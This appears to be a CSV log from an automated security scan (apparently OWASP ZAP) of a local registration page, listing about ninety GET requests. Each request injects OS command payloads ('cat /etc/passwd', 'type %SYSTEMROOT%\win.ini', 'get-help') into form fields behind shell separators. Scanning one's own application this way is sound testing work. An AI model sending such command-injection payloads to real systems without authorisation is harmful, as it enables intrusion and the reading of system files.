ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
1824,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%26type+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,19013
1825,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,61,335,19003
1826,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,19067
1827,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,19021
1828,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,55,335,19043
1829,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,19009
1830,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=get-help&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,18823
1831,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%3Bget-help&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18911
1832,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%3Bget-help&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,47,335,18929
1833,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%3Bget-help&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,64,335,18917
1834,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%3Bget-help+%23&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,58,335,18925
1835,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=cat+%2Fetc%2Fpasswd&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,49,335,18913
1836,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%26cat+%2Fetc%2Fpasswd%26&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,18977
1837,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%3Bcat+%2Fetc%2Fpasswd%3B&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,18957
1838,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%26cat+%2Fetc%2Fpasswd%26%22&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,69,335,19013
1839,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%3Bcat+%2Fetc%2Fpasswd%3B%22&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,54,335,18993
1840,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%26cat+%2Fetc%2Fpasswd%26%27&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18989
1841,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%3Bcat+%2Fetc%2Fpasswd%3B%27&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,67,335,18969
1842,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,1242,345,11938274
1843,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=type+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,69,335,18967
1844,Fri Sep 25 14:40:39 IST 2026,Fri Sep 25 14:40:39 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,57,345,11938274
1845,Fri Sep 25 14:40:39 IST 2026,Fri Sep 25 14:40:39 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%26type+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,83,335,19013
1846,Fri Sep 25 14:40:39 IST 2026,Fri Sep 25 14:40:39 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,46,345,11938274
1847,Fri Sep 25 14:40:39 IST 2026,Fri Sep 25 14:40:39 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,60,335,19003
1848,Fri Sep 25 14:40:40 IST 2026,Fri Sep 25 14:40:40 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,53,345,11938274
1849,Fri Sep 25 14:40:40 IST 2026,Fri Sep 25 14:40:40 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,79,335,19067
1850,Fri Sep 25 14:40:41 IST 2026,Fri Sep 25 14:40:41 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,127,345,11938274
1851,Fri Sep 25 14:40:42 IST 2026,Fri Sep 25 14:40:42 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,80,335,19021
1852,Fri Sep 25 14:40:43 IST 2026,Fri Sep 25 14:40:43 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,61,345,11938274
1853,Fri Sep 25 14:40:43 IST 2026,Fri Sep 25 14:40:43 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,93,335,19043
1854,Fri Sep 25 14:40:44 IST 2026,Fri Sep 25 14:40:44 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,56,345,11938274
1855,Fri Sep 25 14:40:44 IST 2026,Fri Sep 25 14:40:44 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,19009
1856,Fri Sep 25 14:40:45 IST 2026,Fri Sep 25 14:40:45 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,69,345,11938274
1857,Fri Sep 25 14:40:46 IST 2026,Fri Sep 25 14:40:46 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=get-help&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,84,335,18875
1858,Fri Sep 25 14:40:47 IST 2026,Fri Sep 25 14:40:47 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,54,345,11938274
1859,Fri Sep 25 14:40:47 IST 2026,Fri Sep 25 14:40:48 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%3Bget-help&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,84,335,18911
1860,Fri Sep 25 14:40:48 IST 2026,Fri Sep 25 14:40:49 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,116,345,11938274
1861,Fri Sep 25 14:40:49 IST 2026,Fri Sep 25 14:40:49 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%3Bget-help&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,92,335,18929
1862,Fri Sep 25 14:40:51 IST 2026,Fri Sep 25 14:40:51 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%3Bget-help&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,191,335,18917
1863,Fri Sep 25 14:40:51 IST 2026,Fri Sep 25 14:40:51 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,199,345,11938274
1864,Fri Sep 25 14:40:52 IST 2026,Fri Sep 25 14:40:52 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%3Bget-help+%23&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,87,335,18925
1865,Fri Sep 25 14:40:53 IST 2026,Fri Sep 25 14:40:54 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=cat+%2Fetc%2Fpasswd&password=ZAP&phone=9999999999&sport=Cricket,200,OK,96,335,18929
1866,Fri Sep 25 14:40:54 IST 2026,Fri Sep 25 14:40:54 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=get-help,200,OK,62,345,11938274
1867,Fri Sep 25 14:40:54 IST 2026,Fri Sep 25 14:40:54 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%26cat+%2Fetc%2Fpasswd%26&password=ZAP&phone=9999999999&sport=Cricket,200,OK,82,335,18977
1868,Fri Sep 25 14:40:56 IST 2026,Fri Sep 25 14:40:56 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%3Bcat+%2Fetc%2Fpasswd%3B&password=ZAP&phone=9999999999&sport=Cricket,200,OK,86,335,18957
1869,Fri Sep 25 14:40:56 IST 2026,Fri Sep 25 14:40:57 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%3Bget-help,200,OK,107,345,11938274
1870,Fri Sep 25 14:40:56 IST 2026,Fri Sep 25 14:40:56 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%26cat+%2Fetc%2Fpasswd%26%22&password=ZAP&phone=9999999999&sport=Cricket,200,OK,85,335,19013
1871,Fri Sep 25 14:40:58 IST 2026,Fri Sep 25 14:40:59 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%3Bcat+%2Fetc%2Fpasswd%3B%22&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,18993
1872,Fri Sep 25 14:40:59 IST 2026,Fri Sep 25 14:40:59 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%26cat+%2Fetc%2Fpasswd%26%27&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,18989
1873,Fri Sep 25 14:40:59 IST 2026,Fri Sep 25 14:40:59 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%3Bget-help,200,OK,57,345,11938274
1874,Fri Sep 25 14:41:00 IST 2026,Fri Sep 25 14:41:00 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%3Bcat+%2Fetc%2Fpasswd%3B%27&password=ZAP&phone=9999999999&sport=Cricket,200,OK,103,335,18969
1875,Fri Sep 25 14:41:01 IST 2026,Fri Sep 25 14:41:01 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=type+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,82,335,18983
1876,Fri Sep 25 14:41:01 IST 2026,Fri Sep 25 14:41:01 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%26type+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,97,335,19013
1877,Fri Sep 25 14:41:02 IST 2026,Fri Sep 25 14:41:02 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,105,335,19003
1878,Fri Sep 25 14:41:02 IST 2026,Fri Sep 25 14:41:02 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%3Bget-help,200,OK,68,345,11938274
1879,Fri Sep 25 14:41:02 IST 2026,Fri Sep 25 14:41:02 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&password=ZAP&phone=9999999999&sport=Cricket,200,OK,85,335,19067
1880,Fri Sep 25 14:41:03 IST 2026,Fri Sep 25 14:41:03 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,93,335,19021
1881,Fri Sep 25 14:41:04 IST 2026,Fri Sep 25 14:41:04 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&password=ZAP&phone=9999999999&sport=Cricket,200,OK,96,335,19043
1882,Fri Sep 25 14:41:04 IST 2026,Fri Sep 25 14:41:04 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,126,335,19009
1883,Fri Sep 25 14:41:05 IST 2026,Fri Sep 25 14:41:05 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%3Bget-help+%23,200,OK,51,345,11938274
1884,Fri Sep 25 14:41:05 IST 2026,Fri Sep 25 14:41:05 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=get-help&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,18891
1885,Fri Sep 25 14:41:06 IST 2026,Fri Sep 25 14:41:06 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%3Bget-help&password=ZAP&phone=9999999999&sport=Cricket,200,OK,92,335,18911
1886,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%3Bget-help&password=ZAP&phone=9999999999&sport=Cricket,200,OK,83,335,18929
1887,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%3Bget-help&password=ZAP&phone=9999999999&sport=Cricket,200,OK,84,335,18917
1888,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%3Bget-help+%23&password=ZAP&phone=9999999999&sport=Cricket,200,OK,60,335,18925
1889,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=cat+%2Fetc%2Fpasswd&phone=9999999999&sport=Cricket,200,OK,81,335,18929
1890,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%26cat+%2Fetc%2Fpasswd%26&phone=9999999999&sport=Cricket,200,OK,58,335,18977
1891,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%3Bcat+%2Fetc%2Fpasswd%3B&phone=9999999999&sport=Cricket,200,OK,71,335,18957
1892,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%26cat+%2Fetc%2Fpasswd%26%22&phone=9999999999&sport=Cricket,200,OK,79,335,19013
1893,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%3Bcat+%2Fetc%2Fpasswd%3B%22&phone=9999999999&sport=Cricket,200,OK,130,335,18993
1894,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%26cat+%2Fetc%2Fpasswd%26%27&phone=9999999999&sport=Cricket,200,OK,59,335,18989
1895,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%3Bcat+%2Fetc%2Fpasswd%3B%27&phone=9999999999&sport=Cricket,200,OK,85,335,18969
1896,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=type+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,117,335,18983
1897,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%26type+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,57,335,19013
1898,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,61,335,19003
1899,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&phone=9999999999&sport=Cricket,200,OK,55,335,19067
1900,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,57,335,19021
1901,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&phone=9999999999&sport=Cricket,200,OK,70,335,19043
1902,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,58,335,19009
1903,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=get-help&phone=9999999999&sport=Cricket,200,OK,57,335,18891
1904,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%3Bget-help&phone=9999999999&sport=Cricket,200,OK,66,335,18911
1905,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%3Bget-help&phone=9999999999&sport=Cricket,200,OK,60,335,18929
1906,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%3Bget-help&phone=9999999999&sport=Cricket,200,OK,55,335,18917
1907,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%3Bget-help+%23&phone=9999999999&sport=Cricket,200,OK,56,335,18925
1908,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=cat+%2Fetc%2Fpasswd&sport=Cricket,200,OK,46,335,18901
1909,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%26cat+%2Fetc%2Fpasswd%26&sport=Cricket,200,OK,48,335,18977
1910,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%3Bcat+%2Fetc%2Fpasswd%3B&sport=Cricket,200,OK,50,335,18957
1911,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%22%26cat+%2Fetc%2Fpasswd%26%22&sport=Cricket,200,OK,48,335,19013
1912,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%22%3Bcat+%2Fetc%2Fpasswd%3B%22&sport=Cricket,200,OK,53,335,18993
1913,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%27%26cat+%2Fetc%2Fpasswd%26%27&sport=Cricket,200,OK,48,335,18989
1914,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%27%3Bcat+%2Fetc%2Fpasswd%3B%27&sport=Cricket,200,OK,49,335,18969
1915,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=type+%25SYSTEMROOT%25%5Cwin.ini&sport=Cricket,200,OK,57,335,18955
